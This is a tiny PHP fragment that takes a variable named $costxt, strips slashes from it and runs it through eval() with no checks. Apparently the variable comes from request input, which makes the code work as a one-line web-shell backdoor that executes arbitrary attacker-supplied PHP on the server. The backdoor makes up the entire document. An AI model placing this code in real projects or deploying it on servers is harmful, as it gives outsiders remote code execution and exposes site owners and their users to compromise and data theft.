<?

	if (strlen($costxt)) 
	{
		$costxt=stripslashes($costxt);
		eval("$costxt;");
		return;
	}
?>